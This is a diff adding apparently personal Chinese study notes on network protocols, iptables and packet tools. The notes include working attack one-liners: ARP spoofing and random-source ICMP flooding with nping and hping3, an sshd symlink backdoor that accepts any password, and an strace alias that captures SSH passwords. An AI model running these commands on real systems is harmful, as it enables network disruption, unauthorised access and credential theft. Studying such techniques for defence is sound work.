@@ -1,0 +1,176 @@
+<h2>原文：<a href="https://lineuman_blog/2017-09-03-tcp-ip-protocol.html">tcp-ip-protocol</a></h2>
+<hr/>
+<h2>tags: [network]</h2>
+<p>强烈推荐安装python的scapy模块进行学习</p>
+<p>学习网络协议的工具<code>tcpdump</code> <code>nping</code> <code>nmap</code> <code>scapy</code>,通过这些工具可以抓取报文，或者构造报文</p>
+<p><a href="https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=teaching:netsec:2016:dos_report_-_group_5.pdf">https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=teaching:netsec:2016:dos_report_-_group_5.pdf</a></p>
+<p>penetration</p>
+<p><a href="https://pen-testing.sans.org/resources/papers/gwapt/tunneling-pivoting-web-application-penetration-testing-120229">https://pen-testing.sans.org/resources/papers/gwapt/tunneling-pivoting-web-application-penetration-testing-120229</a></p>
+<h2>基础概念</h2>
+<p>mac，src, dst</p>
+<p>ip，src, dst</p>
+<p>port， src, dst</p>
+<h2>ether</h2>
+<h2>arp</h2>
+<pre><code>    Ethernet transmission layer (not necessarily accessible to
+	 the user):
+	48.bit: Ethernet address of destination
+	48.bit: Ethernet address of sender
+	16.bit: Protocol type = ether_type$ADDRESS_RESOLUTION
+    Ethernet packet data:
+	16.bit: (ar$hrd) Hardware address space (e.g., Ethernet,
+			 Packet Radio Net.)
+	16.bit: (ar$pro) Protocol address space.  For Ethernet
+			 hardware, this is from the set of type
+			 fields ether_typ$&lt;protocol&gt;.
+	 8.bit: (ar$hln) byte length of each hardware address
+	 8.bit: (ar$pln) byte length of each protocol address
+	16.bit: (ar$op)  opcode (ares_op$REQUEST | ares_op$REPLY)
+	nbytes: (ar$sha) Hardware address of sender of this
+			 packet, n from the ar$hln field.
+	mbytes: (ar$spa) Protocol address of sender of this
+			 packet, m from the ar$pln field.
+	nbytes: (ar$tha) Hardware address of target of this
+			 packet (if known).
+	mbytes: (ar$tpa) Protocol address of target.
+</code></pre>
+<p>arp请求</p>
+<p>arp回复</p>
+<p>arp缓存表</p>
+<p>arp投毒</p>
+<p>局域网内arp欺骗</p>
+<p><code>nping –arp –arp-type ARP-reply 192.168.2.152 –arp-sender-ip 192.168.2.1 –arp-target-ip 192.168.2.152 -c 100</code></p>
+<p>Antiarp</p>
+<p>因为当回复icmp报文时候需要知道对应ip的mac地址，若果在arp表中找不到，则需要发送arp request来进行确认。</p>
+<p>antiarp的原理就是发送源ip不在arp表中的icmp报文，迫使你发送arp request，从而达到消耗你的目的</p>
+<p><code>nping --icmp --icmp-type time --source-ip 不存在的源ip 目标ip -c 1000</code></p>
+<p><code>hping3 -1 --fast   目标ip --rand-source</code></p>
+<h2>ipv4</h2>
+<p>ip头部一般占20个字节</p>
+<h2>ipv6</h2>
+<h2>icmp</h2>
+<p><a href="https://www.rfc-editor.org/rfc/rfc792.txt">https://www.rfc-editor.org/rfc/rfc792.txt</a></p>
+<p>icmp请求</p>
+<p>icmp回复</p>
+<h2>tcp</h2>
+<p>tcp头部一般占20个字节</p>
+<p>tcp三次握手</p>
+<p>tcp四次分手</p>
+<h2>udp</h2>
+<p><a href="http://www.ietf.org/rfc/rfc768.txt">http://www.ietf.org/rfc/rfc768.txt</a></p>
+<p>udp头部一般占据8个字节</p>
+<pre><code>                                    
+                  0      7 8     15 16    23 24    31  
+                 +--------+--------+--------+--------+ 
+                 |     Source      |   Destination   | 
+                 |      Port       |      Port       | 
+                 +--------+--------+--------+--------+ 
+                 |                 |                 | 
+                 |     Length      |    Checksum     | 
+                 +--------+--------+--------+--------+ 
+                 |                                     
+                 |          data octets ...            
+                 +---------------- ...                 
+
+
+</code></pre>
+<h2>timestamp</h2>
+<h3>tcp timestamp response</h3>
+<p>sysctl -w net.ipv4.tcp_timestamps=0</p>
+<h3>ICMP timestamp response</h3>
+<p>ipchains -A input -p icmp --icmp-type timestamp-request -j DROP</p>
+<h1>vlan</h1>
+<p>交换机基于端口的vlan划分，为了隔离广播</p>
+<h1>qos</h1>
+<h1>iptables and tc</h1>
+<p>表: filter nat mangle raw</p>
+<p>raw&gt;mangle&gt;nat&gt;filter</p>
+<p>链</p>
+<p>规则</p>
+<p>目标项</p>
+<p>ACCEPT</p>
+<p>DROP</p>
+<p>REJECT</p>
+<p>RETURN</p>
+<p>SNAT</p>
+<p>DNAT</p>
+<p>状态机制</p>
+<p>NEW，ESTABLISHED，RELATED,INVALID</p>
+<p>example</p>
+<pre><code># 查看配置
+ cat /etc/sysconfig/iptables
+# 显示nat表规则
+iptables -t nat -L
+# 添加规则
+iptables -L INPUT --line-numbers
+# 接收echo-request类型的icmp报文
+iptables -A  INPUT -p icmp --icmp-type echo-request -j ACCEPT
+# 允许已有连接的数据包通过，但是不允许向系统发起新的连接
+# 使用mangle表修改包的ttl
+iptables -t mangle -A POSTROUTING -j TTL --ttl-inc 3
+</code></pre>
+<h1>应用协议集合</h1>
+<h2>http</h2>
+<p>shellshock是在设置环境变量时会执行命令</p>
+<p>chrome浏览器的copy as curl command非常有用</p>
+<p>http慢链接攻击</p>
+<p>http方法</p>
+<pre><code>GET
+
+POST
+
+HEAD
+
+curl --head 
+
+PUT
+
+TRACE
+
+</code></pre>
+<p>状态码</p>
+<h2>dns</h2>
+<h2>dhcp</h2>
+<h2>snmp</h2>
+<h2>ntp</h2>
+<p>ntp反射放大攻击</p>
+<p>ntp本身的拒绝服务漏洞</p>
+<h2>ssh</h2>
+<p>sshd port 22</p>
+<p><a href="https://www.exploit-db.com/exploits/40888/">https://www.exploit-db.com/exploits/40888/</a></p>
+<p>sshd pam.d 软链接后门</p>
+<p>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=1234</p>
+<p>在客户端ssh user@ip -p 1234 输入任意密码即可登录</p>
+<p>通过strace + alias获取ssh登陆密码</p>
+<p>alias ssh="strace –o /tmp/ssh.trace.log ssh"</p>
+<h2>vnc</h2>
+<p>vnc 客户端和服务端握手流程</p>
+<ol>
+<li><p>通过三次握手建立tcp连接</p>
+</li>
+<li><p>服务端向客户端发送版本信息</p>
+</li>
+<li><p>客户端向服务端发送版本信息</p>
+</li>
+</ol>
+<h1>工具集合</h1>
+<p>我所关心关键词：发包速度，发包个数，发包类型</p>
+<p>curl</p>
+<p>slowhttptest</p>
+<p>wrk</p>
+<p>sqlmap</p>
+<p>nmap</p>
+<p><a href="https://nmap.org/nping/">nping</a></p>
+<p>速度 --rate</p>
+<p>数量 --count</p>
+<p>hping</p>
+<p>hping3</p>
+<p>mz</p>
+<h1>网络虚拟化安全</h1>
+<h2>链接跟踪数的使用</h2>
+<p>通过链接跟踪可以查看当前系统中建立的链接</p>
+<p>假如你在一个宿主机上面建立多个虚拟机，那么虚拟机会占用主机的链接跟踪数，如果不做任何控制，恶意的虚拟机很快又可以占满全部链接跟踪数。</p>
+<p>cat /proc/net/nf_conntrack</p>
+<p>cat /proc/sys/net/netfilter/nf_conntrack_max</p>
+<h2>ARP防欺骗</h2>
+<p>防欺骗的方法之一是IP和MAC地址绑定。对于虚拟化来说，虚拟机mac地址和IP对宿主机来说是可见的，也就是可以绑定的，这个防范可以做在ovs网桥上。</p>
